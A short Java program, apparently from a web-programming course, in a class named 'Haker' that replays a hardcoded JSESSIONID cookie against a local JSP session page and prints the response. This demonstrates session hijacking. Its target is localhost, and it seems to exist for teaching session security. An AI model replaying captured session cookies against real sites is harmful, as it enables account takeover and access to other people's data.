
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.apache.commons.io.IOUtils;


public class Haker {
    public static void main(String[] args) throws Exception{
        String path="http://localhost:8080/JavaWeb20210531/form/bmi_session.jsp";
        URL url=new URL(path);
        HttpURLConnection conn=(HttpURLConnection) url.openConnection();
        conn.setRequestProperty("Cookie", "JSESSIONID=6A27E2555A56E230DEF4D5AD25977B31");
        conn.connect();
        InputStream is=conn.getInputStream();
        System.out.println(IOUtils.toString(is,"UTF-8"));
        
    }
}
